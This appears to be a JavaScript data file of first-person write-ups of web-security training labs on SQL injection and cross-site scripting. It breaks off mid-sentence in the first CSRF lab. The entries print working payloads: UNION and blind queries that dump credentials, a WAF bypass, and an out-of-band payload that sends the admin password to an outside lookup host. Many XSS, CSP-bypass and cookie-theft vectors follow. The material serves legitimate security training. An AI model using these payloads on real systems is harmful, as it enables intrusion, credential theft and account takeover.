const LABS_DATA = [{"num": "1", "title": "SQL Injection", "labs": [{"num": "1.2", "difficulty": "APPRENTICE", "title": "SQL injection enabling authentication bypass", "content": "The SQL comment sequence -- removes the password check from the WHERE clause. By submitting administrator'-- in the username \ufb01eld, the resulting query becomes: SELECT * FROM users WHERE username = 'administrator'--' AND password = '' Whatever is entered in the password \ufb01eld is ignored because the comment tells the database to disregard everything after it. This allows me to successfully log in as the administrator. 1 . 3 PRACTITIONER - SQL injection UNION attack, determining the number of columns returned by the query I started to add \u2018+UNION+SELECT+NULL in the URL category. The UNION keyword retrieves the data from other tables within the database. It enables us to execute one or more additional queries and return as a single result with two columns.We got an Internal Server error meaning it does not match the number of columns in the database. I tried to add \u201cNULL\u201d for the second time but it doesnt works.So when i add the third NULL, it retrieves me now some data . When determining the number of columns, NULL can identify the number of columns because it is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct."}, {"num": "1.4", "difficulty": "PRACTITIONER", "title": "Querying database type and version (MySQL and Microsoft )", "content": "The vulnerability lies in the category \ufb01lter, allowing me to use a UNION attack to retrieve data from injected queries. I used Burp Suite by turning on Intercept, capturing the request, then turning Intercept off and sending it to Repeater. This allowed me to test different payloads and observe the HTTP responses. I successfully discovered that the query returns two columns using the parameter '+UNION+SELECT+NULL,NULL#. However, the goal here was to identify the database version used by the website, so I injected '+UNION+SELECT+@@version,+NULL# to retrieve that information. The database version was 8.0.42-0ubuntu0.20.04.1"}, {"num": "1.5", "difficulty": "PRACTITIONER", "title": "Enumerating database contents (non-Oracle databases)", "content": "First, I discovered that the query returns two columns, both containing text, by using the parameter '+UNION+SELECT+'abc','def'--. To view the list of tables in the database, I used the information schema with the payload '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--. This parameter works for many database types but not for Oracle. When i discover the list of table, I look for the table that consists the credentials and this \u2018users_aurlzol\u2019\u2019 can be that one. After reviewing the list of tables, I identi\ufb01ed users_aurlzol as the one likely containing credentials. To examine its structure, I injected '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+tabl e_name='users_aurlzol'-- I then retrieved the actual credentials using : '+UNION+SELECT+username_tdtano,+password_uyevhz+FROM+users_aurlzol- which displayed the usernames and passwords for wiener, carlos, and the administrator. To verify, I logged in using the administrator's credentials and successfully gained access."}, {"num": "1.6", "difficulty": "PRACTITIONER", "title": "Enumerating database contents (Oracle)", "content": "To retrieve the database version on an Oracle database, I \ufb01rst turned on Burp Intercept and clicked on any category like Lifestyle to capture the request. I sent that request to Repeater and turned Intercept off. In Repeater, I modi\ufb01ed the category parameter to perform a UNION attack. Since I didn't know how many columns the original query returned, I \ufb01rst tested with a simple payload: '+UNION+SELECT+'abc','abc'+FROM+dual--. This uses the dummy table dual (a special table in Oracle) and two string literals. If the response shows those strings, it con\ufb01rms the query returns two columns and both can hold text. After knowing the columns, I replaced the payload with : '+UNION+SELECT+BANNER,+NULL+FROM+v$version-- Here, v$version is a system view containing version information, and BANNER is the column that holds the version string. The +NULL is used as a placeholder for the second column to match the two\u2011column requirement. After sending this request, the database version appeared in the response, solving the lab. The vulnerability here is when user input is treated as executable code rather than just data and this occurs when the user input directly inserts into a SQL query without proper validation or sanitization. It\u2019s allowed me to append/attach a UNION statement to extract a database version. To prevent this, developers should use parameterized queries or prepared statements where the SQL code was separate from the user input."}, {"num": "1.7", "difficulty": "PRACTITIONER", "title": "SQL injection attack, listing the database contents on Oracle", "content": "The lab goal is to determine which table contains the usernames and passwords, Determine the column names in table , Output the content of the table and to login as administrator. I started by intercepting the request when clicking on a product category and sent it to Repeater. First, I needed to determine how many columns the original query returns and which ones accept text data. '+UNION+SELECT+'abc','def'+FROM+dual-- As i try to \ufb01nd the numbers of the column i try to command this \u201cFROM DUAL\u201d and \u201cORDER BY\u201d and we just con\ufb01rm we have 2 columns. The DUAL command is a small, dummy table created automatically by Oracle in the SYS schema, accessible to all users. Now that I knew the column structure, I needed to \ufb01nd the table containing user credentials. Using this command that retrieves all table names from the Oracle system view all_tables : '+UNION+SELECT+table_name,NULL+FROM+all_tables-- With the table name identi\ufb01ed, I needed to know its column structure. I used the following command that queries another system view all_tab_columns to list all columns in that speci\ufb01c table. The response showed two columns with names : '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USER S_OZAYMI\u2019'-- I found the name of column username and password : '+UNION+SELECT+USERNAME_XEAVTL,+PASSWORD_SOOSLS+FROM+USERS_OZAYMI-- The response displayed all usernames and passwords, including the administrator's. I copied the administrator password, logged in, and solved the lab. This lab teaches that Oracle exposes its database structure through system views like all_tables and all_tab_columns. Once you have a UNION injection point, you can query these views to discover table names, column names, and eventually extract sensitive data, all without guessing."}, {"num": "1.8", "difficulty": "PRACTITIONER", "title": "UNION-based injection to identify text-compatible columns", "content": "I go to the category of Gifts, then i add this syntax : '+UNION+SELECT+NULL,NULL,NULL- . Where it helps me to determine the number of columns. After to determine the number of columns, I now test each columns whether it can hold a string data by adding a string value. If the column data type is not compatible with string data, the injected query will cause database error. Like this it gives me the \u201cInternal Server Error\u201d, Move on to the next null and try it instead Now it works. After adding a string to the next column, I noticed that a value appeared in the upper section of the page, revealing data retrieved from the database. I then replaced my test string \"haha\" with that value, 'NHJuPL, and submitted it. The string was successfully added to the last row, con\ufb01rming the injection worked."}, {"num": "1.9", "difficulty": "PRACTITIONER", "title": "UNION-based injection to extract data from other tables", "content": "First is to determine how many columns and which columns consists a string data. I use this '+UNION+SELECT+'abc','def'-- and it retrieves me successfully also the newly 2 added rows. We can now test the username and password selection query by adding this parameter: '+UNION+SELECT+username,+password+FROM+users--. The credentials for both the user and administrator then appear in the output rows. To verify, I try logging in as the administrator and successfully gain access. By using a UNION attack, I extracted all usernames and passwords from the users table and logged in as administrator. The lesson is that any user input that interacts with the database must be properly secured, otherwise something as harmless as a category \ufb01lter can lead to full system compromise."}, {"num": "1.10", "difficulty": "PRACTITIONER", "title": "UNION-based injection retrieving multiple values in a single column", "content": "The vulnerability exists in the category \ufb01lter, and because the application returns query results directly in the response, I can retrieve data from the database. The database contains a users table with columns for username and password. I \ufb01rst injected '+UNION+SELECT+NULL,'abc'-- to verify that the original query returns two columns and that one of them accepts string data. To retrieve both usernames and passwords within a single column, I used concatenation. In Oracle databases, the double-pipe || serves as a string concatenation operator. By injecting '+UNION+SELECT+NULL,username||'~'||password+FROM+users--, I combined each username and password pair with a tilde separator, allowing them to appear together in one output column. The credentials were successfully displayed, and I used the administrator's login details to verify the attack worked."}, {"num": "1.11", "difficulty": "PRACTITIONER", "title": "Blind SQL injection using conditional responses", "content": "The vulnerable parameter here is the tracking cookie. The results of the query are not returned in error but there's a welcome message at the homepage. I noticed that the tracking ID is somehow connected to Welcome back message, When i remove the tracking id it wont appear. The website response when i put True 1=1 (Welcome back would appear) while the False 1=0 (no Welcome back message appears). Testing out it on tables , we just found the users table and administrator exists : Time to \ufb01gure out the password\u2026.. TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a Send it to the intruder then bruteforce the right length numbers of the password. Then proceed to bruteforcing the letter\u2019s of the password. I used this command and then start the attack. The \ufb01rst letter of my password is e. TrackingId=3423423423\u2019+AND+SUBSTRING((SELECT+Password+FROM+Users+WHERE+Use rname='administrator'),1,1)='s I use cluster bomb and this cp,,amd where it guesses the each character. TrackingId=xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),\u00a71\u00a7,1)='\u00a7a\u00a7'--"}, {"num": "1.12", "difficulty": "PRACTITIONER", "title": "Blind SQL injection using conditional errors", "content": "On this lab, we try to focus on the errors that we are receiving because this is Blind sql means the SQL query are not returned but it give is some hints with those error. The application processes the TrackingId cookie in the following query: SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' The error con\ufb01rms that the administrator exists. TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>N THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' I send this to intruder and then the error for length is > 20. Indicating the password has 20 letters. Then let\u2019s identify the correct characters by doing this : TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,\u00a7N\u00a7,1)='\u00a7CHAR\u00a7' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' I \ufb01lter is to only 500 errors would be shown on my screen and now we identi\ufb01ed my password is u79rnovpqnywczkcao6i."}, {"num": "1.13", "difficulty": "PRACTITIONER", "title": "Visible Error-based SQL injection", "content": "The application tracks visitors with a cookie. That cookie value is inserted directly into a SQL query, and the query\u2019s result is not shown. However, if the query fails, the server returns a detailed error message containing parts of the query. This makes it possible to extract data from the database by forcing type conversion errors that reveal the data in the error text. The goal is to obtain the administrator\u2019s password. I started by intercepting a request that contained a TrackingId cookie. I added a single quote to the cookie value and sent it. The server responded with a verbose SQL error, confirming the injection point was inside a string literal. To extract data, I injected a subquery and used CAST() to convert its result to an integer, which triggers an error when the result is not numeric. I \ufb01rst tested with SELECT 1 to ensure the structure worked. Then I tried to retrieve usernames: ' AND 1=CAST((SELECT username FROM users) AS int)--. The query failed because multiple rows were returned, and the error indicated the database returned more than one row. I added LIMIT 1 to return a single row. This time the error message leaked administrator account. AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"}, {"num": "1.14", "difficulty": "PRACTITIONER", "title": "Blind SQL injection using time delays", "content": "The application uses a tracking cookies for analytics and performs SQL query that has a cookie. There are not certain outputs or returned valued but there\u2019s a conditional time delays. SLEEP command differs for each type of databse, here we find it by trial & error method that it is a POSTgreSQL database To do this we can use the following payload : TrackingId=x'||pg_sleep(10)-- To test this out i use \u2018||pg_sleep(10)-- which is a command for PostgreSQL time delay in database. We get a response after 10 sec which con\ufb01rms the SQL injection vulnerability."}, {"num": "1.15", "difficulty": "PRACTITIONER", "title": "Time-based blind SQL injection with data extraction", "content": "This has a blind SQL injection \ufb02aw in the tracking cookie. The cookie value is inserted into a SQL query, but the app doesn't reveal any output or errors it just runs the query silently. However, because the query runs immediately, we can use time delays to \ufb01gure out the administrator's password from the users table. %3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+ THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- Bruteforcing this one is so long, so i decided to try create a python script. I will put the python script under the folder scripts."}, {"num": "1.16", "difficulty": "PRACTITIONER", "title": "Blind SQL injection using out-of-band interaction", "content": "This has a blind SQL injection \ufb02aw in a tracking cookie. The query runs asynchronously with no visible effect, but you can trigger out\u2011of\u2011band DNS interactions. The goal is to cause a DNS lookup to Burp Collaborator, solving the lab. '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\" %3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//BURP-COLLABORATOR- SUBDOMAIN/\">+%25remote%3b]>'),'/l')+FROM+dual-- When an application is completely silent (no output, no errors, no time delays), out\u2011of\u2011band (OAST) techniques become essential. By forcing the database to perform a DNS lookup to a controlled server, you can con\ufb01rm the vulnerability and even ex\ufb01ltrate data."}, {"num": "1.17", "difficulty": "PRACTITIONER", "title": "Blind SQL injection with out-of-band data ex\ufb01ltration", "content": "This involves a blind SQL injection vulnerability in the tracking cookie. The query runs asynchronously with no visible output, but you can trigger out\u2011of\u2011band interactions. The goal is to ex\ufb01ltrate the administrator's password by causing a DNS lookup to Burp Collaborator, then log in. This payload below exploits a blind SQL injection by using Oracle's XMLType and EXTRACTVALUE functions. It injects a malicious XML DOCTYPE that defines an external entity, which triggers an HTTP request to your Burp Collaborator domain. TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encodin g%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//'||(SELECT +password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-SUBDOMAIN.oastify .com/\">+%25remote%3b]>'),'/l')+FROM+dual-- The SQL query concatenates the administrator's password into the subdomain of that request (e.g., password.collaborator.com). When the database processes the XML, it performs a DNS lookup/HTTP request to that domain, leaking the password to your Collaborator server."}, {"num": "1.18", "difficulty": "PRACTITIONER", "title": "Filter bypass using XML encoding", "content": "This has a stock feature but it is vulnerable to SQL Injection. That the query was returning usernames and passwords from the registered users. As we noticed, on this POST request it has a XML code and if i try to inject 1 UNION SELECT NULL it would pop up \u201cAttack detected\u201d on response. So, something is blocking or protecting this application and it could be a \ufb01rewall. To bypass the WAF with XML encoding we use this Hackvertor. Use this Hackvector extension and it helps us to get rid the attack error response. Then add the desired payload and gotcha the credentials. <storeId><@hex_entities>1 UNION SELECT NULL</@hex_entities></storeId> Next is to determine the column count by adding more NULLS and lastly to use this credentials : <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId> The purpose of this command is to extract all usernames and passwords from the users table by leveraging a UNION-based SQL Injection that returns a single column. The delimiter (~) separates the username and password."}]}, {"num": "2", "title": "Cross-Site Scripting (XSS)", "labs": [{"num": "2.2", "difficulty": "APPRENTICE", "title": "Stored XSS in HTML context without encoding", "content": "The comment functionality contains a stored XSS scripting vulnerability where user input is embedded directly into the page without proper encoding. First I entered the <script>alert(1)</script> payload in the comment \ufb01eld, provided random values for the Name and Email \ufb01elds, and posted the comment. When the page reloads, the script runs automatically because the payload is saved on the server and served to anyone who views the page. This proves that the input is not sanitized when submitted or encoded when displayed."}, {"num": "2.3", "difficulty": "APPRENTICE", "title": "DOM XSS via document.write using location.search", "content": "After submitting random text in the search \ufb01eld, I used Inspect Element and discovered my input had been inserted into an img src attribute."}, {"num": "2.4", "difficulty": "APPRENTICE", "title": "DOM XSS via innerHTML using location.search", "content": "This contains a DOM-based cross-site scripting vulnerability where user input \ufb02ows from location.search into an innerHTML assignment, dynamically updating a div element on the page. I injected the payload <img src=1 onerror=alert(1)> into the search parameter. When the browser attempts to load the image from source \"1\", which is an invalid location, it fails and triggers the onerror event handler. This event then executes the alert(1) function, popping up an alert box and con\ufb01rming the XSS vulnerability. Because the payload is handled on the client-side and injected straight into the DOM using innerHTML, it runs instantly upon page load, illustrating DOM-based XSS caused by insecure JavaScript practices."}, {"num": "2.5", "difficulty": "APPRENTICE", "title": "DOM XSS in jQuery anchor href sink", "content": "This contains a DOM-based XSS vulnerability where the application uses jQuery's $ selector function to locate an anchor element (<a>) and dynamically updates its href attribute using data from location.search (the URL parameters). The URL contains a return path followed by a /. To test the vulnerability, I inserted a random word like \"hello\" into the parameter and observed that it appeared re\ufb02ected in the source code inside a div class, con\ufb01rming that user input is being injected into the page. I injected the payload javascript:alert(document.cookie). This payload works because when the href attribute is updated with this value, clicking the link executes the javascript: pseudo-protocol, running the alert(document.cookie) JavaScript code. The user input here is not properly sanitized before being used in the href attribute, allowing attackers to execute arbitrary JavaScript in the context of the victim's browser and can steal session cookies."}, {"num": "2.6", "difficulty": "APPRENTICE", "title": "DOM XSS in jQuery selector via hashchange event", "content": "I went to the exploit server and added a malicious iframe script. This iframe loads the vulnerable homepage and, once loaded, appends an XSS payload to the URL hash. The payload triggers the print() function via an image onerror event. After verifying the exploit worked (by viewing it and seeing the print dialog), I stored it and delivered it to the victim, solving the lab."}, {"num": "2.7", "difficulty": "APPRENTICE", "title": "Re\ufb02ected XSS in attribute with angle brackets encoded", "content": "I submitted a random alphanumeric string in the search box and observed in Burp Suite that it was re\ufb02ected inside a quoted attribute (meaning the input is placed within an HTML tag's attribute value, like value=\"OUR-INPUT\") To exploit this, I changed my input to \"onmouseover=\"alert(1). This payload works by \ufb01rst using a quote (\") to close the current attribute (like value=\"), then adding a new instruction called onmouseover that tells the browser \"when someone hovers the mouse here, run this code.\" After testing the URL, whenever I moved my mouse over that spot, an alert popped up proving the XSS vulnerability worked."}, {"num": "2.8", "difficulty": "APPRENTICE", "title": "Stored XSS in anchor href with double quotes encoded", "content": "First is to comment anything and on the website field please do add some website input Then use Burp Suite to intercept on to repeater. After submitting, the comment was stored. When I viewed the post, my name appeared as a clickable link. Clicking on it triggered an alert, con\ufb01rming the stored XSS vulnerability. The application didn't properly sanitize the website input, allowing a JavaScript URL to be injected into the href attribute."}, {"num": "2.9", "difficulty": "APPRENTICE", "title": "Re\ufb02ected XSS in JavaScript string with angle brackets encoded", "content": "I tested the search functionality by submitting a random alphanumeric string and captured the request in Burp Repeater. The response showed my input re\ufb02ected inside a JavaScript string, with angle brackets encoded to prevent tag injection. To break out of the string and execute JavaScript, I replaced my input with the payload '-alert(1)-'. This works by closing the existing string with a single quote, then injecting alert(1) as a command, and \ufb01nally adding a dash to keep syntax valid. After copying the URL and loading it, the alert \ufb01red, con\ufb01rming the XSS vulnerability."}, {"num": "2.10", "difficulty": "PRACTITIONER", "title": "DOM XSS inside select element using document.write", "content": "This contains a DOM-based XSS vulnerability where the stock checker functionality uses a document .write function, which writes a data out to the page. Send this GET /product?producID=1 to repeater and we will insert on the search query parameter a <img src=\"...\"> attribute. This code creates a dropdown menu for store selection based on URL parameter storeID. It \ufb01rst de\ufb01nes an array of prede\ufb01ned store names. Then it reads the storeID parameter from URL. Using document.write, it writes the opening <select> tag. If a storeId is provided, it writes an <option> element with that value (unsanitized) and marks it as selected. Next, it loops through the prede\ufb01ned stores, adding each as an option except the one that matches the provided storeId. Finally, it closes the <select> tag. To escape the option tags we can use the payload: </option><script>alert(1)</script><option selected> /product?productId=4&storeId=</option><script>alert(1)</script><option%20selected> The payload works because the code writes it directly into the HTML without sanitization. The browser sees the </option> and closes the existing <option> tag, then executes the <script>, which runs alert(1). This demonstrates how unsafely using document.write with user input leads to DOM XSS."}, {"num": "2.11", "difficulty": "PRACTITIONER", "title": "DOM XSS in AngularJS expression with encoding restrictions", "content": "This has a DOM\u2011based XSS vulnerability in an AngularJS application. AngularJS is a Javascript library that scans the contents of HTML notes. The search query is inserted into an AngularJS expression (inside double curly braces) because the page contains an ng-app directive. AngularJS evaluates expressions in the context of its scope. Normally, you would inject HTML, but here angle brackets and double quotes are HTML\u2011encoded, so you cannot break out of the attribute or tag. Instead, you can execute arbitrary JavaScript using AngularJS expressions. The payload exploits the fact that $on is a built\u2011 in AngularJS function and its constructor property points to the Function constructor. By calling $on.constructor('alert(1)'), we create a new function that contains the code alert(1). The final () executes that function, triggering the alert. {{$on.constructor('alert(1)')()}} This bypasses AngularJS\u2019s sandbox and achieves XSS without needing angle brackets or quotes, which are already encoded."}, {"num": "2.12", "difficulty": "PRACTITIONER", "title": "Re\ufb02ected DOM XSS", "content": "This re\ufb02ected DOM vulnerability that occurs when the server-side application processes data from a request and echoes it in the response, and a script on the page then handles that re\ufb02ected data unsafely, ultimately writing it to a dangerous sink like eval. Start by opening Burp Suite and intercept is on in the Proxy tool. In the lab website, use the search bar to enter a random test string such as \"XSS\". Return to Burp and forward the request. On the Intercept tab, you will notice that the string is re\ufb02ected in a JSON response called search-results. From the Site Map, open the searchResults.js \ufb01le and observe that the JSON response is used with an eval() function call. By experimenting with different search strings, you can identify that the JSON response escapes quotation marks but does not escape backslashes. SearchResults.js is the client-side script that takes the JSON response containing the user's search term and passes it to an eval() function. When you inject \\\"-alert(1)}//, the backslash cancels the escaping, allowing the double quote to close the string early and the subtraction operator to separate expressions, so eval() executes alert(1)."}, {"num": "2.13", "difficulty": "PRACTITIONER", "title": "Stored DOM XSS", "content": "This has a stores DOM XSS vulnerability in the comment section. The site tries to \ufb01lter out angle brackets by using JavaScript\u2019s replace() function, but it only replaces the \ufb01rst occurrence of each bracket. I posted a comment with the payload : <><img src=1 onerror=alert(1)> When the comment loaded, the browser saw the img tag with an invalid src, triggering the onerror event and calling alert(), solving the lab. The replace() function is dangerous when used with a string argument because it only removes the \ufb01rst match."}, {"num": "2.14", "difficulty": "PRACTITIONER", "title": "Re\ufb02ected XSS with most tags and attributes blocked", "content": "This has a re\ufb02ected XSS vulnerability in the search functionality protected by a WAF that blocks common vectors. We need to bypass the WAF and call the print() function without user interaction. Begin by testing a standard vector like <img src=1 onerror=print()>, which gets blocked. Use Burp Intruder to fuzz allowed tags by setting the search parameter to <\u00a7\u00a7> and pasting the XSS cheat sheet tag list; the body tag returns a 200 response. Next, fuzz attributes on the body tag by setting <body%20\u00a7\u00a7=1> with the event attributes list; the onresize attribute is allowed. I paste the lists of XSS tags in the payload con\ufb01guration. Then i clear it, change to the list of events. Lastly, let\u2019s try the payload lists. The \"> in the search parameter closes the existing attribute and tag, injecting the body tag. The iframe's onload resizes it, \ufb01ring the onresize event and calling print(). Store and deliver the exploit to the victim to solve the lab."}, {"num": "2.15", "difficulty": "PRACTITIONER", "title": "Re\ufb02ected XSS with restrictive tag \ufb01ltering", "content": "All HTML tags are blocked except custom ones, we need to perform an XSS attack that injects a custom tag and automatically triggers an alert displaying document.cookie. This injection creates a custom tag with the ID x that includes an onfocus event handler calling alert(document.cookie). The #x hash at the end of the URL automatically focuses on this element when the page loads, triggering the alert without any user interaction."}, {"num": "2.16", "difficulty": "PRACTITIONER", "title": "Re\ufb02ected XSS with partial SVG allowance", "content": "This involves a re\ufb02ected XSS vulnerability where common tags are blocked but some SVG elements are allowed. We will be using a Burp Intruder to fuzz allowed tags by setting the search parameter to <\u00a7\u00a7> and pasting the XSS cheat sheet tag list; the <svg>, <animatetransform>, <title>, and <image> tags return a 200 response. Next, fuzz attributes on the <animatetransform> tag by setting <svg><animatetransform%20\u00a7\u00a7=1> with the event attributes list; the onbegin attribute is allowed. The craft payload must be paste on the URL , where \"> closes the existing attribute and injects the SVG tag, and the onbegin event triggers alert(1) when the animation starts."}, {"num": "2.17", "difficulty": "PRACTITIONER", "title": "Re\ufb02ected XSS in canonical link tag", "content": "This involves a re\ufb02ected XSS vulnerability where user input is placed into a canonical link tag, and angle brackets are escaped.I will inject an attribute that triggers an alert when a speci\ufb01c key combination is pressed. The `accesskey` attribute makes the X key trigger the `onclick` event when pressed with Alt (or other combinations), calling `alert(1)`."}, {"num": "2.18", "difficulty": "PRACTITIONER", "title": "Re\ufb02ected XSS in escaped JavaScript string", "content": "This has a re\ufb02ected XSS vulnerability in the search query tracking functionality, where user input is re\ufb02ected inside a JavaScript string with single quotes and backslashes escaped. After submitting a random test string, you'll observe it appears within a JavaScript block, and attempting a standard payload like test'payload con\ufb01rms that the single quote is backslash-escaped, blocking direct string breakouts. The solution lies in closing the entire script block and injecting a new one using </script><script>alert(1)</script>, which works because the browser parses HTML before JavaScript, so the closing tag terminates the original script and your new script executes the alert. The vulnerability here is when the escaping quotes alone is insu\ufb03cient when input is placed inside a script block, as attackers can escape the script context entirely."}, {"num": "2.19", "difficulty": "PRACTITIONER", "title": "Re\ufb02ected XSS with multiple encoding layers", "content": "This involves a re\ufb02ected XSS vulnerability in the search query tracking functionality, where user input is re\ufb02ected inside a JavaScript string. The application HTML-encodes angle brackets and double quotes while escaping single quotes with backslashes. After submitting a random test string and observing its re\ufb02ection, attempting test'payload con\ufb01rms single quotes are backslash-escaped, but testing test\\payload reveals backslashes are not escaped. The payload \\'-alert(1)// exploits this: the injected backslash neutralizes the escaping backslash, allowing the single quote to close the string, the minus operator separates expressions, alert(1) executes, and the double slash comments out the rest. The vulnerability stems from inconsistent escaping where backslashes remain unescaped while single quotes are escaped, allowing attackers to nullify the escaping mechanism and break out of the JavaScript string."}, {"num": "2.20", "difficulty": "PRACTITIONER", "title": "Stored XSS in onclick event with escaping controls", "content": "This involves a stored XSS vulnerability in the comment functionality, speci\ufb01cally within the onclick event handler of the comment author's name. After posting a comment with a random alphanumeric string in the Website input and viewing the post, you'll observe that the string is re\ufb02ected inside an onclick event handler attribute. The application HTML-encodes angle brackets and double quotes while escaping single quotes and backslashes, which would normally prevent injection. However, by using the payload http://foo?&apos;-alert(1)-&apos;, the &apos; entity decodes to a single quote, breaking out of the onclick attribute's string. The minus operators separate the expressions, allowing alert(1) to execute within the JavaScript context, and clicking the name triggers the alert."}, {"num": "2.21", "difficulty": "PRACTITIONER", "title": "Re\ufb02ected XSS in template literal with Unicode escaping", "content": "This re\ufb02ects user input inside a JavaScript template literal (backticks) with heavy Unicode escaping of special characters. After con\ufb01rming re\ufb02ection, use ${alert(1)} as the payload. Template literals evaluate embedded expressions inside ${}, so the alert executes despite the escaping. The \ufb02aw is failing to escape or remove the ${} delimiter within template literals, allowing arbitrary JavaScript execution. Prevention requires either avoiding user input in template literals, removing ${ sequences, or implementing a strict CSP."}, {"num": "2.22", "difficulty": "PRACTITIONER", "title": "Cookie theft via XSS", "content": "This features a stored XSS vulnerability in blog comments. Post a comment with a script that sends the victim's cookies to a Burp Collaborator domain.Then copy the session cookie and use it us own. When the victim views the comment, their cookies are ex\ufb01ltrated. Use the captured cookie to impersonate the victim and access their account. The vulnerability is unsanitized user input that executes in victims' browsers, allowing cookie theft."}, {"num": "2.23", "difficulty": "PRACTITIONER", "title": "Credential capture via XSS", "content": "This contains a stored XSS vulnerability in the blog comments function. I posted a comment containing a malicious payload that creates username and password input \ufb01elds, then ex\ufb01ltrates credentials when the victim types their password. The payload captured the victim's username and password and sent them to my Burp Collaborator subdomain. I polled Collaborator to retrieve the credentials, then logged in as the victim to solve the lab. The vulnerability is stored XSS allowing attackers to inject keylogging forms that capture credentials."}, {"num": "2.24", "difficulty": "PRACTITIONER", "title": "CSRF bypass via XSS", "content": "After logging in with the provided credentials, I examined the email update functionality on the user account page. Viewing the page source revealed that changing the email requires a POST request to /my-account/change-email with an email parameter and a CSRF token hidden in a \ufb01eld named token. It means that directly changing the victim's email would require stealing their token \ufb01rst. I crafted a stored XSS payload that does exactly that: when the victim views the blog comment, their browser fetches /my-account, extracts the CSRF token using a regex match on the response, and automatically submits a POST request to change their email to test@test.com using the stolen token. The payload was posted as a comment, and when the victim viewed it, the email was changed, solving the lab. The vulnerability is stored XSS enabling attackers to bypass CSRF protections by stealing tokens directly from the victim's session."}, {"num": "2.25", "difficulty": "PRACTITIONER", "title": "CSP bypass using dangling markup", "content": "I solved the lab by noticing the CSP was missing the form-action directive. That meant I could submit forms to any external site. I set up my exploit server with a script that did two things:"}, {"num": "2.26", "difficulty": "EXPERT", "title": "AngularJS sandbox escape without string literals", "content": "I visited the lab URL with a crafted search parameter that tricks AngularJS into breaking out of its security sandbox. The payload overwrites a built-in JavaScript function (charAt) that AngularJS relies on for protection. Once that function is broken, I used orderBy \ufb01lter with encoded characters to inject alert(1) without using quotes, which the sandbox would normally block. The page then executed the alert. https://0a01008503a316df8075854600300077.web-security-academy.net/?search=1&toStrin g().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(12 0,61,97,108,101,114,116,40,49,41)=1 The \ufb02aw is an AngularJS sandbox escape caused by modifying core JavaScript prototypes."}, {"num": "2.27", "difficulty": "EXPERT", "title": "AngularJS sandbox escape with CSP", "content": "I crafted an exploit that bypasses both CSP and the AngularJS sandbox to trigger alert(document.cookie). The payload was delivered via a URL parameter: ?search=<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x. When the page loads, the hash focuses on the input, triggering the ng-focus event. AngularJS processes the expression, where $event.composedPath() returns an array of elements including the window object. The orderBy \ufb01lter then executes the assigned function (z=alert)(document.cookie) once the array reaches the window object, effectively calling alert without directly referencing window that bypassing both CSP and sandbox restrictions. The \ufb02aw here is in AngularJS's expression evaluation and \ufb01lter handling, which allowed indirect execution of arbitrary JavaScript despite CSP."}, {"num": "2.28", "difficulty": "EXPERT", "title": "Re\ufb02ected XSS with event handlers and href blocked", "content": "The application allowed <svg> and <a> tags but blocked event handlers and href attributes. I bypassed this by injecting an <animate> tag inside the SVG to dynamically set the <a> tag's href to javascript:alert(1). The link displayed \"Click me\" to lure the victim into clicking, which triggered the alert. https://0aec008503ad84428180bb69003c00aa.web-security-academy.net/?search=%3Csvg% 3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E %3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E The vulnerability here is the Incomplete tag whitelisting enabled indirect injection of javascript: URIs via SVG animation."}, {"num": "2.29", "difficulty": "EXPERT", "title": "Re\ufb02ected XSS in restricted JavaScript URL", "content": "I navigated to the URL with a crafted payload that injects into a JavaScript URL context. The payload uses an arrow function to throw an exception, with onerror set to alert and passing 1337. Since spaces are blocked, I used /**/ as a comment separator. The toString property of window is overridden to trigger the exception when a string conversion occurs (via window+''). Clicking \"Back to blog\" forces the conversion and executes alert(1337). https://0a6f00cf04743776808d083300770002.web-security-academy.net/post?postId=5&%2 7},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27 The vulnerability here is The application re\ufb02ects user input into a JavaScript URL without proper sanitization, allowing injection of executable code despite blocking some characters. Attackers can use creative JavaScript constructs to bypass \ufb01lters."}, {"num": "2.30", "difficulty": "EXPERT", "title": "CSP bypass techniques", "content": "I \ufb01rst tested a standard <img src=1 onerror=alert(1)> and con\ufb01rmed it was re\ufb02ected but blocked by CSP. Examining the response revealed a Content-Security-Policy header with a report-uri directive containing a token parameter that I could control. By injecting ;script-src-elem 'unsafe-inline' into the token, I modi\ufb01ed the CSP to allow inline scripts. I then delivered a simple <script>alert(1)</script> payload in the search parameter, which executed successfully. https://0a34001e041ec5c583ee5a81004600de.web-security-academy.net/?search=%3Cscrip t%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27 The vulnerability lies in allowing user input to control CSP directives via the token parameter, enabling attackers to weaken the policy."}]}, {"num": "3", "title": "Cross-Site Request Forgery (CSRF)", "labs": [{"num": "3.2", "difficulty": "PRACTITIONER", "title": "Token validation dependent on request method", "content": "After logging in, I intercepted the email change request and observed that it required a CSRF token. However, when I converted the request from POST to GET using Burp 